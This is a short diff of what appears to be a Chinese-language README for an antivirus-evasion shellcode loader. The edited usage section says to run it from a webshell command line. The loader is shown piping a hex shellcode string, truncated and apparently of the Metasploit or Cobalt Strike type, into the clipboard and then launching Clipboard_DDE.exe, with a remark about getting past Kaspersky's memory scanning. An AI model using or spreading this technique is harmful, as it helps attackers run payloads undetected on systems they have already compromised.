@@ -8,7 +8,7 @@
 
 卡巴斯基内存查杀主要看你shellcode能不能过了
 
-用法：
+用法：webshell命令行下执行
 ```
 echo fc4883e4f0e8c00000004... | clip
 start Clipboard_DDE.exe\
